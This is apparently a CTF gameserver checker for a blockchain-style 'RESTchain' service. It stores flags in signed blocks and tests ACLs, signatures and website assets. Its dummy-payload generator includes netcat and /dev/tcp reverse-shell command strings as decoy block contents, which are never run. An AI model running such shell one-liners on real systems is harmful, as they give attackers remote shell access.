import os
import random
import collections
import base64
import string

import requests

from ctf_gameserver.checker import BaseChecker
from ctf_gameserver.checker.constants import OK, TIMEOUT, NOTWORKING, NOTFOUND

from .client import RESTchainClient, RESTchainSignedData, RESTchainError, RESTchainBlockPermissionDenied, RESTchainBlockNotFound, GENESIS_BLOCK_ID

def is_proxy_timeout(e):
	if not isinstance(e, RESTchainError):
		return False
	r = e.r()
	return r is not None and r.status_code in {503, 504}

class RestchainChecker(BaseChecker):
	def __init__(self, tick, team, service, ip):
		super().__init__(tick, team, service, ip)
		self.service_url = 'http://{}:{}'.format(ip, os.environ.get('RESTCHAIN_PORT', 6060))
		self.client = RESTchainClient('http://{}:{}/api'.format(ip, os.environ.get('RESTCHAIN_PORT', 6060)))
		self.ref_client = RESTchainClient(os.environ.get('RESTCHAIN_REF_API', 'http://127.0.0.1:6060/api'))
		self.last_block = GENESIS_BLOCK_ID

	def place_flag(self):
		try:
			self.logger.debug('requesting a new key pair')
			private_key, public_key = self.client.generate_private_key()
			self.logger.debug('public key: %s', repr(public_key))
			self.logger.debug('private key: %s', repr(private_key))
			self._put('privatekey', self.tick, private_key)
			self._put('publickey', self.tick, public_key)

			self.logger.debug('requesting require-signature acl')
			acl = self.client.get_acl('require-signature', {'key[FAUST]': public_key})
			self.logger.debug('acl: %s', repr(acl))

			block_data = RESTchainSignedData(body=self.get_flag(self.tick))
			block_data.set_header('Acl', acl)
			block_data.set_header('Nonce', os.urandom(32).hex())
			self.logger.debug('block data: %s', repr(block_data))

			self.logger.debug('putting block')
			block = self.client.put_block(GENESIS_BLOCK_ID, block_data, private_key, public_key)
			self.logger.debug('block: %s', repr(block))

			self._put('flagid', self.tick, block.block_id)
			return OK
		except RESTchainError as e:
			self.logger.error('%s', repr(e))
			if is_proxy_timeout(e):
				return TIMEOUT
			return NOTWORKING

	def check_flag(self, tick):
		try:
			block_id = self._get('flagid', tick)
			if not block_id:
				self.logger.error('could not retrieve flag/block ID of tick %d', tick)
				return NOTFOUND
			self.logger.debug('retrieved flag/block id: %s', repr(block_id))
			private_key = self._get('privatekey', tick)
			if not private_key:
				self.logger.error('could not retrieve private key of tick %d', tick)
				return NOTFOUND
			self.logger.debug('retrieved private key: %s', repr(private_key))
			public_key = self._get('publickey', tick)
			if not public_key:
				self.logger.error('could not retrieve public key of tick %d', tick)
				return NOTFOUND
			self.logger.debug('retrieved public key: %s', repr(public_key))

			try:
				block = self.client.get_block(block_id)
			except RESTchainBlockPermissionDenied as e:
				stub = e.block_stub
				self.logger.debug('accessing block without access signature: %s', repr(e))
				self.logger.debug('block stub: %s', repr(stub))
				if stub.signer != public_key:
					self.logger.error('returned invalid public key for block: %s, expected %s', repr(stub.signer), repr(public_key))
					return NOTWORKING
				if not self.client.verify(public_key, stub.signed_data, stub.signature):
					self.logger.error('returned signature does not verify')
					return NOTWORKING
			except RESTchainBlockNotFound as e:
				self.logger.error('block not found: %s', repr(e))
				return NOTFOUND
			else:
				self.logger.error('could fetch block without access signature: %s', repr(block))
				return NOTWORKING

			self.logger.debug('requesting access signature')
			access_sig = self.client.sign(private_key, RESTchainSignedData(content_type='application/vnd.faust.faustctf-2018-restchain-access-signature'))
			self.logger.debug('access signature: %s', repr(access_sig))

			self.logger.debug('requesting block')
			try:
				block = self.client.get_block(block_id, {'X-Restchain-Acl-Key-Id': 'FAUST', 'X-Restchain-Acl-Signature': access_sig})
			except RESTchainBlockNotFound as e:
				self.logger.error('block not found: %s', repr(e))
				return NOTFOUND
			self.logger.debug('block: %s', repr(block))

			retrieved_flag = block.body
			expected_flag = self.get_flag(tick)
			if retrieved_flag == expected_flag:
				self.logger.info('retrieved %s as expected', repr(expected_flag))
				return OK
			else:
				self.logger.error('retrieved %s, expected %s', repr(retrieved_flag), repr(expected_flag))
				return NOTFOUND
		except RESTchainError as e:
			self.logger.error('%s', repr(e))
			if is_proxy_timeout(e):
				return TIMEOUT
			return NOTWORKING

	def check_service(self):
		checks = [
			self.check_service_crypto_api,
			self.check_service_block_genesis,
			self.check_service_block_basics,
			self.check_service_block_acl_always_allow,
			self.check_service_block_acl_always_deny,
			self.check_service_block_acl_require_secret,
			self.check_service_block_acl_require_signature,
			self.check_service_website_html,
			self.check_service_website_assets,
			self.check_service_download_jar,
			self.check_service_javadoc,
		]
		random.shuffle(checks)
		result = OK
		for check in checks:
			self.logger.info('executing check: %s', check.__name__)
			try:
				check_result = check()
			except RESTchainError as e:
				self.logger.error('%s result: %s', check.__name__, repr(e))
				if is_proxy_timeout(e):
					return TIMEOUT
				result = NOTWORKING
			else:
				self.logger.info('%s result: %s', check.__name__, repr(check_result))
				assert type(check_result) is bool
				if not check_result:
					result = NOTWORKING
		return result

	def check_service_crypto_api(self):
		priv, pub = self.client.generate_private_key()
		self.logger.debug('private: %s public: %s', priv, pub)
		data = get_dummy_data()
		team_sig = self.client.sign(priv, data)
		self.logger.debug('team signature: %s', repr(team_sig))

		# verify valid signature
		if not self.client.verify(pub, data, team_sig):
			self.logger.error('team signature was not accepted by team verify')
			return False
		# validate against refernce API
		if not self.ref_client.verify(pub, data, team_sig):
			self.logger.error('team signature was not accepted by reference verify')
			return False

		ref_sig = self.ref_client.sign(priv, data)
		if ref_sig != team_sig:
			self.logger.info('team signature differs from reference signature')
			# verify reference sig
			if not self.client.verify(pub, data, ref_sig):
				self.logger.error('reference signature was not accepted by team verify')
				return False

		# tamper with data
		data.set_header('X-' + os.urandom(random.randint(8, 16)).hex(), os.urandom(random.randint(4, 32)).hex())

		# verify valid signature
		if self.client.verify(pub, data, team_sig):
			self.logger.error('tampered team signature was accepted by team verify')
			return False
		# validate against refernce API
		if self.ref_client.verify(pub, data, team_sig):
			self.logger.error('tampered team signature was accepted by reference verify')
			return False

		if ref_sig != team_sig:
			# verify reference sig
			if self.client.verify(pub, data, ref_sig):
				self.logger.error('tampered reference signature was accepted by team verify')
				return False

		return True

	def check_service_block_genesis(self):
		team_genesis = self.client.get_block(GENESIS_BLOCK_ID)
		ref_genesis = self.client.get_block(GENESIS_BLOCK_ID)
		if team_genesis != ref_genesis:
			self.logger.error('wrong genesis block: %s', repr(team_genesis))
			return False
		else:
			return True

	def check_service_block_basics(self):
		priv, pub = self.ref_client.generate_private_key()
		self.logger.debug('private: %s public: %s', priv, pub)
		data = get_dummy_data()
		self.logger.debug('putting block data: %s', repr(data))
		block = self.client.put_block(self.last_block, data, priv, pub)
		team_block_id = self.client.get_block_id(data, self.last_block, pub, block.signature)
		self.last_block = block.block_id
		if block.block_id != team_block_id:
			self.logger.error('real block id and value returned by block id API inconsistent: %s vs %s', repr(block.block_id), repr(team_block_id))
			self.logger.error('block: %s', repr(block))
			return False

		fetched_block = self.client.get_block(block.block_id)
		if block != fetched_block:
			self.logger.error('fetched block %s, expected %s', repr(fetched_block), repr(block))
			return False

		return True

	def check_service_block_acl_always_allow(self):
		priv, pub = self.ref_client.generate_private_key()
		self.logger.debug('private: %s public: %s', priv, pub)
		acl = self.client.get_acl('always-allow')
		self.logger.debug('received acl: %s', repr(acl))
		data = get_dummy_data()
		data.set_header('Acl', acl)
		self.logger.debug('putting block data: %s', repr(data))
		block = self.client.put_block(self.last_block, data, priv, pub)
		self.last_block = block.block_id
		try:
			fetched_block = self.client.get_block(block.block_id)
			if block == fetched_block:
				self.logger.info('fetched expected block')
				return True
			else:
				self.logger.error('fetched block %s, expected %s', repr(fetched_block), repr(block))
				return False
		except RESTchainBlockPermissionDenied as e:
			self.logger.error('received 403 for always-allow: %s', repr(e))
			return False

	def check_service_block_acl_always_deny(self):
		priv, pub = self.ref_client.generate_private_key()
		self.logger.debug('private: %s public: %s', priv, pub)
		acl = self.client.get_acl('always-deny')
		self.logger.debug('received acl: %s', repr(acl))
		data = get_dummy_data()
		data.set_header('Acl', acl)
		self.logger.debug('putting block data: %s', repr(data))
		block = self.client.put_block(self.last_block, data, priv, pub)
		self.last_block = block.block_id
		try:
			block = self.client.get_block(block.block_id)
		except RESTchainBlockPermissionDenied:
			return True
		else:
			self.logger.error('access always-deny was not denied: %s', repr(block))
			return False

	def check_service_block_acl_require_secret(self):
		priv, pub = self.ref_client.generate_private_key()
		self.logger.debug('private: %s public: %s', priv, pub)
		secret = os.urandom(random.randint(8, 32)).hex()
		acl = self.client.get_acl('require-secret', {'secret': secret})
		self.logger.debug('received acl: %s', repr(acl))
		data = get_dummy_data()
		data.set_header('Acl', acl)
		self.logger.debug('putting block data: %s', repr(data))
		block = self.client.put_block(self.last_block, data, priv, pub)
		self.last_block = block.block_id

		try:
			fetched_block = self.client.get_block(block.block_id)
		except RESTchainBlockPermissionDenied:
			pass
		else:
			self.logger.error('access allowed for require-secret without secret: %s', repr(fetched_block))
			return False

		try:
			fetched_block = self.client.get_block(block.block_id, {'X-Restchain-Acl-Secret': secret})
			if block != fetched_block:
				self.logger.error('fetched block %s, expected %s', repr(fetched_block), repr(block))
				return False
		except RESTchainBlockPermissionDenied as e:
			self.logger.error('received 403 for require-secret with correct secret: %s', repr(e))
			return False

		return True

	def check_service_block_acl_require_signature(self):
		block_priv, block_pub = self.ref_client.generate_private_key()
		self.logger.debug('block: private: %s public: %s', block_priv, block_pub)
		acl_priv, acl_pub = self.ref_client.generate_private_key()
		self.logger.debug('acl: private: %s public: %s', acl_priv, acl_pub)
		keyid = os.urandom(random.randint(4, 8)).hex()
		acl = self.client.get_acl('require-signature', {'key[{}]'.format(keyid): acl_pub})
		self.logger.debug('received acl: %s', repr(acl))
		data = get_dummy_data()
		data.set_header('Acl', acl)
		self.logger.debug('putting block data: %s', repr(data))
		block = self.client.put_block(self.last_block, data, block_priv, block_pub)
		self.last_block = block.block_id

		try:
			fetched_block = self.client.get_block(block.block_id)
		except RESTchainBlockPermissionDenied:
			pass
		else:
			self.logger.error('access allowed for require-signature without secret: %s', repr(fetched_block))
			return False

		data_access = RESTchainSignedData(content_type='application/vnd.faust.faustctf-2018-restchain-access-signature')
		team_access_sig = self.client.sign(acl_priv, data_access)
		ref_access_sig = self.ref_client.sign(acl_priv, data_access)
		self.logger.debug('team access signature: %s', repr(team_access_sig))
		self.logger.debug('reference access signature: %s', repr(ref_access_sig))

		self.logger.debug('trying to access block %s with team signature', repr(block.block_id))
		try:
			fetched_block = self.client.get_block(block.block_id, {
				'X-Restchain-Acl-Key-Id': keyid,
				'X-Restchain-Acl-Signature': team_access_sig,
			})
			if block != fetched_block:
				self.logger.error('fetched block %s, expected %s', repr(fetched_block), repr(block))
				return False
		except RESTchainBlockPermissionDenied as e:
			self.logger.error('received 403 for require-signature with team signature: %s', repr(e))
			return False

		self.logger.debug('trying to access block %s with ref signature', repr(block.block_id))
		try:
			fetched_block = self.client.get_block(block.block_id, {
				'X-Restchain-Acl-Key-Id': keyid,
				'X-Restchain-Acl-Signature': ref_access_sig,
			})
			if block != fetched_block:
				self.logger.error('fetched block %s, expected %s', repr(fetched_block), repr(block))
				return False
		except RESTchainBlockPermissionDenied as e:
			self.logger.error('received 403 for require-signature with ref signature: %s', repr(e))
			return False

		return True

	def check_service_website_html(self):
		res = requests.get(self.service_url)
		if res.status_code != 200:
			self.logger.error('requesting index.html: %s', repr(res))
			return False
		chunks = [
			'<title>RESTchain</title>',
			'<h1 class="display-2">Getting Started</h1>',
			'<code>http://', '/api</code>',
			'<h3 class="h2">Java</h3>',
			'<a href="/download/restchain.jar">Download</a>',
			'<a href="/doc/java/?net/faustctf/_2018/restchain/RESTchainClient.html">Documentation</a>',
			'<h1 class="display-2 display-2--light">Pricing</h1>',
		]
		for chunk in chunks:
			if chunk not in res.text:
				self.logger.error('did not find %s in index.html', repr(chunk))
				return False
		return True

	def check_service_website_assets(self):
		files = [
			'/css/fonts.css',
			'/css/micons/fonts/icomoon.svg',
			'/css/micons/fonts/icomoon.woff',
			'/css/micons/fonts/icomoon.ttf',
			'/css/micons/fonts/icomoon.eot',
			'/css/micons/micons.css',
			'/css/base.css',
			'/css/main.css',
			'/css/vendor.css',
			'/css/font-awesome/fonts/fontawesome-webfont.svg',
			'/css/font-awesome/fonts/fontawesome-webfont.woff',
			'/css/font-awesome/fonts/fontawesome-webfont.woff2',
			'/css/font-awesome/fonts/fontawesome-webfont.eot',
			'/css/font-awesome/fonts/fontawesome-webfont.ttf',
			'/css/font-awesome/fonts/FontAwesome.otf',
			'/css/font-awesome/css/font-awesome.min.css',
			'/css/font-awesome/css/font-awesome.css',
			'/doc/java/deprecated-list.html',
			'/doc/java/stylesheet.css',
			'/doc/java/serialized-form.html',
			'/doc/java/net/faustctf/_2018/restchain/SignedData.html',
			'/doc/java/net/faustctf/_2018/restchain/AccessToken.html',
			'/doc/java/net/faustctf/_2018/restchain/PrivateKey.html',
			'/doc/java/net/faustctf/_2018/restchain/package-frame.html',
			'/doc/java/net/faustctf/_2018/restchain/RESTchainBlockNotFound.html',
			'/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html',
			'/doc/java/net/faustctf/_2018/restchain/Acl.html',
			'/doc/java/net/faustctf/_2018/restchain/RESTchainBlockPermissionDenied.html',
			'/doc/java/net/faustctf/_2018/restchain/package-summary.html',
			'/doc/java/net/faustctf/_2018/restchain/package-tree.html',
			'/doc/java/net/faustctf/_2018/restchain/PublicKey.html',
			'/doc/java/net/faustctf/_2018/restchain/AccessTokenFactory.html',
			'/doc/java/net/faustctf/_2018/restchain/RESTchainRuntimeException.html',
			'/doc/java/net/faustctf/_2018/restchain/Signature.html',
			'/doc/java/net/faustctf/_2018/restchain/RESTchainException.html',
			'/doc/java/net/faustctf/_2018/restchain/Block.html',
			'/doc/java/net/faustctf/_2018/restchain/AclFactory.html',
			'/doc/java/script.js',
			'/doc/java/help-doc.html',
			'/doc/java/allclasses-frame.html',
			'/doc/java/index.html',
			'/doc/java/overview-tree.html',
			'/doc/java/allclasses-noframe.html',
			'/doc/java/index-all.html',
			'/doc/java/package-list',
			'/doc/java/constant-values.html',
			'/fonts/montserrat/montserrat-black-webfont.woff',
			'/fonts/montserrat/montserrat-semibold-webfont.woff2',
			'/fonts/montserrat/montserrat-regular-webfont.woff',
			'/fonts/montserrat/montserrat-semibold-webfont.woff',
			'/fonts/montserrat/montserrat-thin-webfont.woff2',
			'/fonts/montserrat/montserrat-medium-webfont.woff2',
			'/fonts/montserrat/montserrat-bold-webfont.woff',
			'/fonts/montserrat/montserrat-medium-webfont.woff',
			'/fonts/montserrat/montserrat-black-webfont.woff2',
			'/fonts/montserrat/montserrat-extralight-webfont.woff',
			'/fonts/montserrat/montserrat-extrabold-webfont.woff',
			'/fonts/montserrat/montserrat-light-webfont.woff',
			'/fonts/montserrat/montserrat-extrabold-webfont.woff2',
			'/fonts/montserrat/montserrat-thin-webfont.woff',
			'/fonts/montserrat/montserrat-bold-webfont.woff2',
			'/fonts/montserrat/montserrat-light-webfont.woff2',
			'/fonts/montserrat/montserrat-extralight-webfont.woff2',
			'/fonts/montserrat/montserrat-regular-webfont.woff2',
			'/fonts/lora/lora-bold-webfont.woff2',
			'/fonts/lora/lora-italic-webfont.ttf',
			'/fonts/lora/lora-bold-webfont.woff',
			'/fonts/lora/lora-regular-webfont.woff2',
			'/fonts/lora/lora-bolditalic-webfont.woff2',
			'/fonts/lora/lora-italic-webfont.woff',
			'/fonts/lora/lora-italic-webfont.woff2',
			'/fonts/lora/lora-regular-webfont.woff',
			'/fonts/lora/lora-bold-webfont.ttf',
			'/fonts/lora/lora-bolditalic-webfont.woff',
			'/images/left-arrow.png',
			'/images/logo-footer.png',
			'/images/hero-bg.jpg',
			'/images/contact-bg.jpg',
			'/images/right-arrow.png',
			'/images/logo.png',
			'/images/email-icon.png',
			'/images/photoswipe/default-skin.svg',
			'/images/photoswipe/preloader.gif',
			'/images/photoswipe/default-skin.png',
			'/js/main.js',
			'/js/plugins.js',
			'/js/jquery-3.2.1.min.js',
			'/js/pace.min.js',
			'/js/modernizr.js',
		]
		for f in random.sample(files, random.randint(len(files)//4, len(files)//2)):
			res = requests.get(self.service_url + f)
			if res.status_code != 200:
				self.logger.error('error requesting %s: %s', repr(f), repr(res))
				return False
		return True

	def check_service_download_jar(self):
		res = requests.get(self.service_url + '/download/restchain.jar')
		if res.status_code != 200:
			self.logger.error('requesting restchain.jar: %s', repr(res))
			return False
		content_type = res.headers.get('Content-Type')
		if content_type not in ['application/x-java-archive', 'application/java-archive']:
			self.logger.error('restchain.jar: unexpected content-type %s', repr(content_type))
			return False
		if not res.content.startswith(b'\x50\x4b\x03\x04'):
			self.logger.error('restchain.jar does not start with zip magic number')
			return False
		return True

	def check_service_javadoc(self):
		checks = collections.defaultdict(list)
		for line in JAVADOC_DATA.splitlines():
			f, chunk = line.split(':', 1)
			checks[f].append(chunk)
		for f, chunks in checks.items():
			self.logger.debug('requesting %s', repr(f))
			res = requests.get(self.service_url + f)
			if res.status_code != 200:
				self.logger.error('requesting %s: %s', repr(f), repr(res))
				return False
			for chunk in chunks:
				if chunk not in res.text:
					self.logger.error('did not find %s in %s', repr(chunk), repr(f))
					return False
		return True

	def _key_tick(self, key, tick):
		return '{}_{:03d}'.format(key, tick)

	def _put(self, key, tick, value):
		return self.store_blob(self._key_tick(key, tick), value.encode('utf-8'))

	def _get(self, key, tick):
		value = self.retrieve_blob(self._key_tick(key, tick))
		if value is not None:
			return value.decode('utf-8')

def get_dummy_payload():
	return random.choice([
		os.urandom(random.randint(4, 128)).hex(),
		base64.b64encode(os.urandom(random.randint(4, 128))).decode(),
		'/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535)),
		'/bin/sh -c "/bin/{} -e /bin/sh 10.66.{}.{} {}"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535), random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
		'/bin/bash -i >& /dev/tcp/10.66.{}.{}/{} 0>&1'.format(random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
		'A' * random.randint(4, 16),
		'B' * random.randint(4, 16),
		'How many cryptocurrencies do you currently hodl?',
		'May we offer you our latest shitcoin?',
		'Never gonna give you up, never gonna let you down',
		'The dog\'s core is based on blockchain technology!',
		'Boost your business using RESTchain!',
		'Did you check out {} so far?'.format(random.choice([
			'JODLGANG',
			'Cryptocurrencies helpline',
			'Diagon Alley',
			'FAUST Coin',
			'MtCamlX',
			'RESTchain',
			'The Tangle',
		])),
	])

def get_dummy_header_name():
	l = random.randint(1, 4)
	name = 'X'
	for i in range(l):
		name += '-'
		name += random.choice(string.ascii_lowercase)
		for j in range(random.randint(0,16)):
			name += random.choice(string.ascii_uppercase)
	return name

def get_dummy_data():
	data = RESTchainSignedData(body=get_dummy_payload())
	data.set_header('Nonce', os.urandom(random.randint(1,32)).hex())
	for i in range(random.randint(0, 5)):
		v = random.choice([
			os.urandom(32).hex()[:random.randint(1,63)],
			base64.b64encode(os.urandom(random.randint(4, 32))).decode(),
			'A' * random.randint(4, 16),
		])
		data.set_header(get_dummy_header_name(), v)
	return data

# grep -Fr -e '<span class="typeNameLabel">' -e '<span class="memberNameLink">'
JAVADOC_DATA = """\
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<pre>public class <span class="typeNameLabel">SignedData</span>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colOne"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#SignedData-java.util.Map-java.lang.String-byte:A-">SignedData</a></span>(java.util.Map&lt;java.lang.String,java.util.List&lt;java.lang.String&gt;&gt;&nbsp;headers,
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colOne"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#SignedData-java.lang.String-byte:A-">SignedData</a></span>(java.lang.String&nbsp;contentType,
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colOne"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#SignedData-java.lang.String-java.lang.String-">SignedData</a></span>(java.lang.String&nbsp;contentType,
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#addHeader-java.lang.String-java.lang.String-">addHeader</a></span>(java.lang.String&nbsp;name,
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#deleteHeader-java.lang.String-">deleteHeader</a></span>(java.lang.String&nbsp;name)</code>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#getAcl--">getAcl</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#getBody--">getBody</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#getContentType--">getContentType</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#getHeader-java.lang.String-">getHeader</a></span>(java.lang.String&nbsp;name)</code>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#getHeaderAll-java.lang.String-">getHeaderAll</a></span>(java.lang.String&nbsp;name)</code>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#getHeaders--">getHeaders</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#setAcl-net.faustctf._2018.restchain.Acl-">setAcl</a></span>(<a href="../../../../net/faustctf/_2018/restchain/Acl.html" title="class in net.faustctf._2018.restchain">Acl</a>&nbsp;acl)</code>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#setBody-byte:A-">setBody</a></span>(byte[]&nbsp;body)</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#setBody-java.lang.String-">setBody</a></span>(java.lang.String&nbsp;body)</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#setContentType-java.lang.String-">setContentType</a></span>(java.lang.String&nbsp;contentType)</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#setHeader-java.lang.String-java.lang.String-">setHeader</a></span>(java.lang.String&nbsp;name,
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#setHeaders-java.util.Map-">setHeaders</a></span>(java.util.Map&lt;java.lang.String,java.util.List&lt;java.lang.String&gt;&gt;&nbsp;headers)</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/SignedData.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/SignedData.html#toString--">toString</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/AccessToken.html:<pre>public class <span class="typeNameLabel">AccessToken</span>
/doc/java/net/faustctf/_2018/restchain/PrivateKey.html:<pre>public class <span class="typeNameLabel">PrivateKey</span>
/doc/java/net/faustctf/_2018/restchain/PrivateKey.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/PrivateKey.html#getPublicKey--">getPublicKey</a></span>()</code>
/doc/java/net/faustctf/_2018/restchain/PrivateKey.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/PrivateKey.html#toString--">toString</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/RESTchainBlockNotFound.html:<pre>public class <span class="typeNameLabel">RESTchainBlockNotFound</span>
/doc/java/net/faustctf/_2018/restchain/RESTchainBlockNotFound.html:<td class="colOne"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainBlockNotFound.html#RESTchainBlockNotFound-int-java.lang.String-">RESTchainBlockNotFound</a></span>(int&nbsp;statusCode,
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<pre>public class <span class="typeNameLabel">RESTchainClient</span>
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colOne"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#RESTchainClient-java.lang.String-">RESTchainClient</a></span>(java.lang.String&nbsp;apiUrl)</code>
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#generatePrivateKey--">generatePrivateKey</a></span>()</code>
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#getAccessTokenFactory--">getAccessTokenFactory</a></span>()</code>
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#getAclFactory--">getAclFactory</a></span>()</code>
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#getBlock-java.lang.String-">getBlock</a></span>(java.lang.String&nbsp;blockId)</code>
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#getBlock-java.lang.String-net.faustctf._2018.restchain.AccessToken-">getBlock</a></span>(java.lang.String&nbsp;blockId,
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#getGenesisBlock--">getGenesisBlock</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#putBlock-net.faustctf._2018.restchain.Block-net.faustctf._2018.restchain.SignedData-net.faustctf._2018.restchain.PrivateKey-">putBlock</a></span>(<a href="../../../../net/faustctf/_2018/restchain/Block.html" title="class in net.faustctf._2018.restchain">Block</a>&nbsp;previousBlock,
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#putBlock-java.lang.String-net.faustctf._2018.restchain.SignedData-net.faustctf._2018.restchain.PrivateKey-">putBlock</a></span>(java.lang.String&nbsp;previousBlockId,
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#sign-net.faustctf._2018.restchain.PrivateKey-net.faustctf._2018.restchain.SignedData-">sign</a></span>(<a href="../../../../net/faustctf/_2018/restchain/PrivateKey.html" title="class in net.faustctf._2018.restchain">PrivateKey</a>&nbsp;privateKey,
/doc/java/net/faustctf/_2018/restchain/RESTchainClient.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainClient.html#verify-net.faustctf._2018.restchain.PublicKey-net.faustctf._2018.restchain.SignedData-net.faustctf._2018.restchain.Signature-">verify</a></span>(<a href="../../../../net/faustctf/_2018/restchain/PublicKey.html" title="class in net.faustctf._2018.restchain">PublicKey</a>&nbsp;publicKey,
/doc/java/net/faustctf/_2018/restchain/Acl.html:<pre>public class <span class="typeNameLabel">Acl</span>
/doc/java/net/faustctf/_2018/restchain/Acl.html:<td class="colOne"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Acl.html#Acl-java.lang.String-">Acl</a></span>(java.lang.String&nbsp;acl)</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/Acl.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Acl.html#getAclString--">getAclString</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/Acl.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/Acl.html#toString--">toString</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/RESTchainBlockPermissionDenied.html:<pre>public class <span class="typeNameLabel">RESTchainBlockPermissionDenied</span>
/doc/java/net/faustctf/_2018/restchain/RESTchainBlockPermissionDenied.html:<td class="colLast"><code><span class="memberNameLink"><a href="../../../../net/faustctf/_2018/restchain/RESTchainBlockPermissionDenied.html#getBlockStub--">getBlockStub</a></span>()</code>&nbsp;</td>
/doc/java/net/faustctf/_2018/restchain/PublicKey.html:<pre>public class <span class="typeNameLabel">PublicKey</span>
